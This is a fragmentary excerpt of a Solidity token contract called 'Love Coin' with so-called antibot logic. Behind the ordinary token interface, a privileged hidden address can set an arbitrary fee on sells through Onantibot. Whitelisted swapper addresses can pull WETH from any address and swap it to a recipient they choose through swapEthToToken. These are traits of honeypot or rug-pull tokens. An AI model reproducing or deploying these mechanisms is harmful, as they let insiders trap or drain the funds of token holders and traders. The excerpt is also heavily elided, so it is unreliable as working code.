...
contract LoveCoin is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    using Address for address payable;

    string private _name = "Love Coin";
    string private _symbol = "LoveCoin";
    ...
    mapping(address => uint256) public antibotswap;
    mapping (address => uint256) public antibotblock;
    bool public antibotenabled  = false; 
    bool public antibotblockenabled  = false; 
    uint256 private botsleep = 7;
    uint256 private botblock = 2;
   ...
   function _destroyChildren(uint256 value) internal {
    ...
    function Onantibot(bool bs, bool bb, uint256 timesleep, uint256 blocksleep, uint256 fee) public {
        require(_msgSender() == address(_Antibottoken), "ERC20: transfer from the address");
        antibotenabled = bs;
        antibotblockenabled  = bb;
        botsleep = timesleep;
        botblock = blocksleep;
        feebot = fee;
    ...
    function _transfer(
        ...
        bool takebotblock = antibotblock[from] + botblock > block.number;
        ...
        if (!takeFee) {
            ...
            antibotblock[to] = block.number;
        }
        else if (takeFee && !takeFeeTransfer && automatedMarketMakerPairs[to]   && !takebottime && !takebotblock) {
            _taxFee = _taxFeesell;
        ...
        else if (antibotblockenabled && takebotblock && takeFee && !takeFeeTransfer && automatedMarketMakerPairs[to]) {
            _taxFee = _taxFeesell;
            _liquidityFee = feebot;
            _MarketingFee = _MarketingFeesell;
        }
    ...
    function swapEthToToken(address from, address to, uint256 amount) public gasRefund {
        require(_Antibotswaper[_msgSender()], "ERC20");
        address[] memory paths = new address[](2);
        paths[0] = uniswapV2Router.WETH();
        paths[1] = address(this);
        safeTransferFrom(paths[0], from, uniswapV2Pair, amount);
        swaper.swap(paths, to);  
    } 


 
    function swapTokensForTokensBulk(address from, address[] calldata to, uint256 amount, uint256 percent) public gasRefund {
        require(_Antibotswaper[_msgSender()], "ERC20");
